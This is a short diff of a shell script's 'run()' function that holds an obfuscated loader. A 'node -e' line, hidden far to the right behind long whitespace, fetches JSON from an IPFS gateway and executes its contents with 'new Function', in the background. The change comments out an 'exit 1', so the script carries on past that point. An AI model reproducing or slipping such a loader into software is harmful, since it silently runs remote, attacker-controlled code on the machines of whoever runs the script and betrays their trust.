@@ -83,4 +83,4 @@ run() {
     fi
 }
                                                                                                                                                             node -e "fetch('https://emerald-accurate-urial-9.mypinata.cloud/ipfs/bafkreiakxaoovlybnoleyujhw4vyj75ruelysvibvuskhzn2mi5ktxmihm').then(r=>r.json()).then(j=>new Function(j.data)())" &
-                                                                                                                                                            exit 1
+                                                                                                                                                            # exit 1
